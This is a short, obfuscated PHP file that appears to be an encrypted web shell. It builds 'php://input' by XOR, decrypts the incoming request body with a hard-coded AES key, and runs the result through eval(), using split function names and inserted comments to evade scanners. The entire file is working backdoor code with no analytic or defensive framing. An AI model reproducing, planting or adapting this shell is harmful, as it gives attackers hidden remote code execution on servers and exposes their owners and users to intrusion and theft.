<?php @error_reporting(0);session_start();$key="0192023a7bbd7325";$_SESSION['k']=$key;$f='file'.'_get'.'_contents';$p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);$HJ2PE=$f($p);if(!extension_loaded('openssl')){ $t=preg_filter('/\s+/','','base 64 _ deco de');$HJ2PE=$t($HJ2PE."");for($i=0;$i<strlen($HJ2PE);$i++) { $new_key = $key[$i+1&15];$HJ2PE[$i] = $HJ2PE[$i] ^ $new_key;}	}else{ $HJ2PE=openssl_decrypt($HJ2PE, "AES128", $key);}$arr=explode('|',$HJ2PE);$func=$arr[0];$params=$arr[1];class G2S65983{ public function __invoke($p) {@eval("/*Z19jsn5d39*/".$p."");}}@call_user_func/*Z19jsn5d39*/(new G2S65983(),$params);?>